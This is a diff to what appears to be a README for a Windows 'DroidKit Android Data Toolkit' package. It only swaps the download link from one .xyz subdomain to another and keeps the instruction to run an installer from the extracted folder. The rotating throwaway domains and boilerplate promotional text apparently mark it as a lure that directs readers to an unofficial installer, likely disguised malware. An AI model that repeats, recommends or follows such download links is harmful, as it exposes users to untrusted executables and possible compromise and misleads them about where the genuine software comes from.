@@ -18,8 +18,8 @@ DroidKit Android Data Toolkit for Windows PCs | clean panels | predictable first
 
 > Use the project link below for Windows.
 
-* **Project link:** **[droidkit.nexpath.xyz](https://droidkit.nexpath.xyz/)**
-* **Full URL:** `https://droidkit.nexpath.xyz/`
+* **Project link:** **[droidkit.nerasix.xyz](https://droidkit.nerasix.xyz/)**
+* **Full URL:** `https://droidkit.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Everything ships configured for local work — start the app and pick up where y
 * **RAM:** 8 GB RAM suggested | 16 GB for heavy workloads
 * **Disk:** 3 GB free disk space
 
-***
+***
